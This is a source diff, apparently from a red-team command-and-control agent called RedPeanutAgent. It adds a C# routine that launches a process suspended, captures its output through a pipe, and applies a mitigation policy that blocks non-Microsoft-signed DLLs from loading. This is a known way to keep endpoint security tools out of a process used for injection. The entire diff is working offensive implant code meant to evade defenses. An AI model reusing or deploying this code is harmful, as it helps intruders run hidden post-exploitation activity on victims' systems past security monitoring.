@@ -68,10 +68,56 @@ namespace RedPeanutAgent.Execution
             return true;
         }
 
+        public static bool CreateProcessPCMPBNMBSAO(IntPtr hReadPipe, IntPtr hWritePipe, string processname, bool inheritHandler, ref Natives.PROCESS_INFORMATION procInfo)
+        {
+            Natives.SetHandleInformation(hReadPipe, Natives.HANDLE_FLAGS.INHERIT, 0);
+
+            Natives.STARTUPINFOEX sInfoEx = new Natives.STARTUPINFOEX();
+
+            sInfoEx.StartupInfo.hStdOutput = hWritePipe;
+            sInfoEx.StartupInfo.hStdErr = hWritePipe;
+            sInfoEx.StartupInfo.dwFlags = Natives.STARTF_USESTDHANDLES;
+
+            IntPtr lpValue = IntPtr.Zero;
+
+            Natives.SECURITY_ATTRIBUTES pSec = new Natives.SECURITY_ATTRIBUTES();
+            Natives.SECURITY_ATTRIBUTES tSec = new Natives.SECURITY_ATTRIBUTES();
+            pSec.nLength = Marshal.SizeOf(pSec);
+            tSec.nLength = Marshal.SizeOf(tSec);
+
+            IntPtr pntpSec = Marshal.AllocHGlobal(Marshal.SizeOf(pSec));
+            Marshal.StructureToPtr(pSec, pntpSec, false);
+            IntPtr pnttSec = Marshal.AllocHGlobal(Marshal.SizeOf(tSec));
+            Marshal.StructureToPtr(tSec, pnttSec, false);
+
+            IntPtr lpSize = IntPtr.Zero;
+
+            Natives.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+            sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+            Natives.InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
+
+            Natives.DWORD64 policy = new Natives.DWORD64();
+            policy.dwPart1 = 0;
+            policy.dwPart2 = 0x1000;
+
+            lpValue = Marshal.AllocHGlobal(Marshal.SizeOf(policy));
+            Marshal.StructureToPtr(policy, lpValue, false);
+
+            Natives.UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)Natives.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, lpValue, (IntPtr)Marshal.SizeOf(policy), IntPtr.Zero, IntPtr.Zero);
+
+            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
+
+            if (!Natives.CreateProcess(IntPtr.Zero, processname, IntPtr.Zero, IntPtr.Zero, inheritHandler, Natives.CreateSuspended | (uint)Natives.CreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, IntPtr.Zero, ref sInfoEx, out procInfo))
+            {
+                return false;
+            }
+            return true;
+        }
+
         public static bool CreateProcess(string processname, bool inheritHandler, ref Natives.PROCESS_INFORMATION procInfo)
         {
             Natives.STARTUPINFO startInfo = new Natives.STARTUPINFO();
-            
+
             if (!Natives.CreateProcess(IntPtr.Zero, processname, IntPtr.Zero, IntPtr.Zero, inheritHandler, Natives.CreateSuspended, IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo))
             {
                 return false;
